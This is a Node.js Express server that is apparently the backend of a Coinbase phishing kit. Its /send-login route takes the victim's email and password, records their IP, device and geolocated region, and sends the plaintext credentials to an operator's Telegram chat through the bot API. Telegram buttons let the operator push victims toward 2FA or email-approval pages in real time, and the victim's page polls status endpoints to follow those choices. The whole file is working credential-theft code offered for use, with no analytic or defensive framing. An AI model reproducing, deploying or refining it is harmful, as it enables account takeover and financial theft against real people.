const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🔍 DETECTION FUNCTIONS
// ============================================================================

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    console.log(`   🌍 Detecting region for IP: ${ip}`);
    
    // Try geojs.io first
    console.log(`   📍 Trying geojs.io...`);
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    console.log(`   📍 geojs.io response:`, JSON.stringify(data));
    
    if (data.city && data.country) {
      const region = `${data.city}, ${data.country}`;
      console.log(`   ✅ Region detected (geojs): ${region}`);
      return region;
    }
    
    // If geojs fails, try ip-api.com
    console.log(`   📍 geojs failed, trying ip-api.com...`);
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    console.log(`   📍 ip-api response:`, JSON.stringify(data2));
    
    if (data2.city && data2.country) {
      const region = `${data2.city}, ${data2.country}`;
      console.log(`   ✅ Region detected (ip-api): ${region}`);
      return region;
    }
    
    console.log(`   ⚠️ Both services returned no data`);
    return "Unknown Region";
    
  } catch (error) {
    console.error(`   ❌ Region detection error:`, error.message);
    return "Unknown Region";
  }
}

// ============================================================================
// 💾 STORAGE
// ============================================================================

let userIdCounter = 1;  // Start from 1
const userIds = {};
const pendingApprovals = {};

console.log(`\n${"=".repeat(60)}`);
console.log(`✅ STORAGE INITIALIZED`);
console.log(`   pendingApprovals: ${JSON.stringify(pendingApprovals)}`);
console.log(`${"=".repeat(60)}\n`);

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Self-ping sent - Render kept alive`);
    } catch (err) {
      console.error(`❌ Self-ping failed:`, err.message);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// POST /send-login
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    console.log(`\n${"=".repeat(60)}`);
    console.log(`📥 COINBASE LOGIN RECEIVED`);
    console.log(`${"=".repeat(60)}`);
    console.log(`   📧 Email: ${email}`);
    console.log(`   👤 User ID: #${userId}`);

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`   💻 Device: ${device}`);
    console.log(`   🌍 Region: ${region}`);
    console.log(`   📍 IP: ${ip}`);

    console.log(`\n📌 STORING IN pendingApprovals`);
    
    const message =
      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log(`\n📨 SENDING TO TELEGRAM`);
    console.log(`   URL: ${url}`);
    
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log(`   Status: ${response.status}`);

    if (response.ok) {
      console.log(`   ✅ Message sent successfully`);
      
      pendingApprovals[email] = {
        status: "pending",
        timestamp: Date.now(),
        userId,
        password,
        region,
        device,
        ip
      };

      console.log(`\n💾 STORED IN MEMORY:`);
      console.log(`   pendingApprovals["${email}"] =`, pendingApprovals[email]);
      console.log(`${"=".repeat(60)}\n`);
      
      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      console.error("   ❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Login error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-status - WITH DEBUG
// ============================================================================

app.post("/check-status", (req, res) => {
  try {
    const { email } = req.body;
    
    console.log(`\n🔍 CHECK-STATUS REQUEST`);
    console.log(`   Email: ${email}`);
    console.log(`   Current pendingApprovals:`, pendingApprovals);

    if (!email) {
      console.log(`   ❌ No email provided!`);
      return res.json({ status: "unknown" });
    }

    if (pendingApprovals[email]) {
      const currentStatus = pendingApprovals[email].status || "pending";
      console.log(`   ✅ FOUND EMAIL IN STORAGE!`);
      console.log(`   Current status: ${currentStatus}`);
      
      return res.json({
        status: currentStatus,
        email: email
      });
    }

    console.log(`   ❌ EMAIL NOT FOUND IN STORAGE!`);
    console.log(`   Available emails: ${Object.keys(pendingApprovals).join(", ") || "NONE"}`);
    res.json({ status: "unknown" });

  } catch (err) {
    console.error("❌ Check status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status - WITH DEBUG
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    console.log(`\n${"=".repeat(60)}`);
    console.log(`📬 UPDATE-STATUS REQUEST`);
    console.log(`${"=".repeat(60)}`);
    console.log(`   Email: ${email}`);
    console.log(`   Status: ${status}`);

    if (!email || !status) {
      console.log(`   ❌ Missing email or status!`);
      return res.status(400).json({ error: "Missing email or status" });
    }

    console.log(`\n🔍 CHECKING STORAGE...`);
    console.log(`   Current pendingApprovals:`, pendingApprovals);

    if (!pendingApprovals[email]) {
      console.log(`   ❌ EMAIL NOT FOUND!`);
      pendingApprovals[email] = {};
      console.log(`   ✅ Created new entry`);
    } else {
      console.log(`   ✅ EMAIL FOUND!`);
      console.log(`   Old status: ${pendingApprovals[email].status}`);
    }

    // Map status codes
    let finalStatus = status;
    if (status === "page1") {
      finalStatus = "accepted1";
    } else if (status === "page2") {
      finalStatus = "accepted2";
    } else if (status === "reject") {
      finalStatus = "rejected";
    }

    console.log(`\n📝 UPDATING STATUS...`);
    console.log(`   From: ${pendingApprovals[email].status}`);
    console.log(`   To: ${finalStatus}`);
    
    pendingApprovals[email].status = finalStatus;
    pendingApprovals[email].updatedAt = Date.now();

    console.log(`\n✅ STATUS UPDATED!`);
    console.log(`   New value:`, pendingApprovals[email]);
    console.log(`${"=".repeat(60)}\n`);

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    console.error("❌ Update status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = app.listen(PORT, () => {
  console.log(`\n${"=".repeat(60)}`);
  console.log(`✅ SERVER STARTED`);
  console.log(`📍 Backend URL: ${APP_URL}`);
  console.log(`🔌 Port: ${PORT}`);
  console.log(`${"=".repeat(60)}\n`);

  startSelfPing();
});

module.exports = { app, server };
